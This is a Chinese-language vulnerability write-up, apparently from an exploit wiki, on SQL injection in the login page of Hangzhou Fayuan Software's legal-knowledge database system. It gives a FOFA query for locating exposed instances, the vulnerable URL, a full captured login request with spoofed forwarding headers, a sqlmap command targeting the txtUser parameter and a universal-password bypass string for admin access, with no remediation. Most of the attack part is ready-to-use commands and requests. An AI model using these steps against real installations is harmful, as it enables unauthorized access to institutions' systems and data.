# 杭州法源软件 法律知识数据库系统 SQL注入漏洞

## 漏洞描述

杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录前台存在通用SQLi漏洞

## 漏洞影响

> [!NOTE]
>
> 杭州法源软件 法律知识数据库系统

## FOFA

> [!NOTE]
>
> icon_hash="2018105215" || title="实践教学平台 - 杭州法源软件开发有限公司"

## 漏洞复现

进入页面如下

![](http://wikioss.peiqi.tech/vuln/fy-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

出现漏洞的Url为

```
http://xxxxxxx/JusRepos/ui/login.aspx
```

![](http://wikioss.peiqi.tech/vuln/fy-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

抓取登录的请求包

```
POST /JusRepos/ui/login.aspx HTTP/1.1
Host: xxx.xxx.xxx.xxxx
Content-Length: 362
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: ASP.NET_SessionId=0upclbweiokwx4qnkpfzumir
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTE4NTUyMzg5NDNkZBLjR6E85W4xvkheqS5g7gOsMdeop3Xfh1BwnTSCbV7z&__VIEWSTATEGENERATOR=E3BBEDB7&__EVENTVALIDATION=%2FwEdAATFHpXckaPEvZEyN%2BNhIQGTDFTzKcXJqLg%2BOeJ6QAEa2jPSlu16Yx4QbiDU%2BdddK1MwoKxxc3z27YmfD4jI4gVsV9%2FpN02jZyPKj4JeL7G5UVenPtL%2FK1en7XvhZG5vyHk%3D&txtUser=admin&txtPwd=123&btnSub=%E7%99%BB%E5%BD%95
```

其中注入的参数为 POST数据中的 **txtUser** 参数, 保存为文件使用 Sqlmap跑一下

```
sqlmap -r sql.txt -p txtUser
```

![](http://wikioss.peiqi.tech/vuln/fy-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

同时还存在着万能密码可以直接登录后台

```
user: 1' or 1=1 --
pass: peiqi
```

![](http://wikioss.peiqi.tech/vuln/fy-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)